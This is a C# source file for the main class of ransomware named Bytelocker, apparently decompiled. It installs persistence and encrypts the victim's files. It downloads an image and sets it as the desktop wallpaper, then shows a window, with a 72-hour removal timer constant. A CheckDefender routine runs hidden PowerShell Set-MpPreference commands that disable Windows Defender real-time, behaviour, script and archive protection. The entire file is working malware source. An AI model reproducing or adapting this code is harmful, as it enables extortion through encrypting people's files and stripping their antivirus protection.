using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Bytelocker.CryptoManager;
using Bytelocker.Installer;
using Bytelocker.Settings;
using Bytelocker.Tools;
using Bytelocker.UI;
using Microsoft.Win32;

namespace Bytelocker;

internal class Bytelocker
{
	private static readonly RegistryManager rm = new RegistryManager();

	public static int TIME_TILL_REMOVAL_HOURS = 72;

	private static readonly uint SPI_SETDESKWALLPAPER = 20u;

	private static readonly uint SPIF_UPDATEINIFILE = 1u;

	private static readonly uint SPIF_SENDWININICHANGE = 2u;

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	public static void SetWallpaper(string path)
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", writable: true);
		registryKey.SetValue("WallpaperStyle", 0.ToString());
		registryKey.SetValue("TileWallpaper", 0.ToString());
		SystemParametersInfo(SPI_SETDESKWALLPAPER, 0u, path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
	}

	public static bool SetOptions(string optionsName, string optionsData, ref string msg)
	{
		bool result = true;
		RegistryKey currentUser = Registry.CurrentUser;
		RegistryKey registryKey = currentUser.OpenSubKey("Control Panel\\Desktop", writable: true);
		try
		{
			if (registryKey != null)
			{
				registryKey.SetValue(optionsName.ToUpper(), optionsData);
				return result;
			}
			return false;
		}
		catch
		{
			result = false;
			msg = "Error when read the registry";
			return result;
		}
		finally
		{
			currentUser.Close();
			registryKey.Close();
		}
	}

	public static void Main(string[] args)
	{
		Install();
		using (WebClient webClient = new WebClient())
		{
			webClient.DownloadFile("https://images.itnewsinfo.com/lmi/articles/grande/000000051470.jpg", "C:\\Windows\\000000051470.jpg");
		}
		Encrypt();
		LaunchWindow();
		if (rm.ReadAllValues(RegistryManager.FILES_KEY_NAME)[0] == "null")
		{
			Uninstall();
		}
		else
		{
			LaunchWindow();
		}
	}

	private static void Encrypt()
	{
		if (!rm.ReadBoolValue(RegistryManager.SETTINGS_KEY_NAME, "UIShown"))
		{
			CryptoManagerMainHandler cryptoManagerMainHandler = new CryptoManagerMainHandler();
			cryptoManagerMainHandler.EncryptAll();
			string text = "C:\\Windows\\000000051470.jpg";
			if (File.Exists(text))
			{
				SetWallpaper(text);
			}
		}
	}

	public static void CheckDefender()
	{
		Process process = new Process
		{
			StartInfo = new ProcessStartInfo
			{
				FileName = "powershell",
				Arguments = "Get-MpPreference -verbose",
				UseShellExecute = false,
				RedirectStandardOutput = true,
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true
			}
		};
		process.Start();
		while (!process.StandardOutput.EndOfStream)
		{
			string text = process.StandardOutput.ReadLine();
			if (text.Contains("DisableRealtimeMonitoring") && text.Contains("False"))
			{
				Disable("Set-MpPreference -DisableRealtimeMonitoring $true");
			}
			else if (text.Contains("DisableBehaviorMonitoring") && text.Contains("False"))
			{
				Disable("Set-MpPreference -DisableBehaviorMonitoring $true");
			}
			else if (text.Contains("DisableBlockAtFirstSeen") && text.Contains("False"))
			{
				Disable("Set-MpPreference -DisableBlockAtFirstSeen $true");
			}
			else if (text.Contains("DisableIOAVProtection") && text.Contains("False"))
			{
				Disable("Set-MpPreference -DisableIOAVProtection $true");
			}
			else if (text.Contains("SignatureDisableUpdateOnStartupWithoutEngine") && text.Contains("False"))
			{
				Disable("Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true");
			}
			else if (text.Contains("DisableArchiveScanning") && text.Contains("False"))
			{
				Disable("Set-MpPreference -DisableArchiveScanning $true");
			}
			else if (text.Contains("DisableIntrusionPreventionSystem") && text.Contains("False"))
			{
				Disable("Set-MpPreference -DisableIntrusionPreventionSystem $true");
			}
			else if (text.Contains("DisableScriptScanning") && text.Contains("False"))
			{
				Disable("Set-MpPreference -DisableScriptScanning $true");
			}
		}
	}

	private static void Disable(string args)
	{
		Process process = new Process
		{
			StartInfo = new ProcessStartInfo
			{
				FileName = "powershell",
				Arguments = args,
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true
			}
		};
		process.Start();
	}

	public static void Decrypt()
	{
		CryptoManagerMainHandler cryptoManagerMainHandler = new CryptoManagerMainHandler();
		cryptoManagerMainHandler.DecryptAll();
	}

	public static void Uninstall()
	{
		new Uninstall();
	}

	private static void Install()
	{
		new Persistence();
	}

	[STAThread]
	private static void LaunchWindow()
	{
		rm.CreateBoolValue(RegistryManager.SETTINGS_KEY_NAME, "UIShown", value: true);
		if (rm.ReadStringValue(RegistryManager.SETTINGS_KEY_NAME, "t") == "none")
		{
			rm.CreateStringValue(RegistryManager.SETTINGS_KEY_NAME, "t", B64Manager.ToBase64(DateTime.Now.ToString()));
		}
		MainWindow mainWindow = new MainWindow();
		Application.EnableVisualStyles();
		Application.Run((Form)(object)mainWindow);
	}
}
